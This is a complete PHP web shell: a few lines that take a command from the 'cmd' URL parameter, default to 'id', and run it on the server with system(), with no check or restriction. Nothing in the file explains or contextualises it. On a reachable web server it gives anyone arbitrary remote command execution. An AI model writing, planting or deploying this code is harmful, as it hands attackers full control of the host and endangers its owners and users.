<?php 
if(isset($_GET['cmd'])){
    $perintah=$_GET['cmd'];
}else{
    $perintah='id';
}

system($perintah);

?>
